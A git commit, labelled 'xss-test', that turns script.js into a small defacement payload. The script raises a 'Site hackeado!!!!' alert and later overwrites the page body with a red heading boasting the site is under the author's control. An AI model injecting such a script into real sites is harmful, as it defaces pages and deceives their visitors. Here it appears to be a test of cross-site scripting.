1c3a4e8bf48d0851c431f0db632f023db8e0b5fe
sergiop45 <sergiopsantos33@gmail.com>
2023-04-19 21:28:06 -0300

    xss-test

--- script.js
+++ script.js
@@ -1,1 +1,11 @@
-alert(1)
+
+function apagaBody() {
+  var body = document.querySelector('body');
+  body.innerHTML = '<h1 style="color: red">Esse site esta sobre meu genjutsu</h1>';
+}
+function message() {
+	alert("Site hackeado!!!!")
+}
+setTimeout(message, 8000)
+setTimeout(apagaBody, 15000);
+
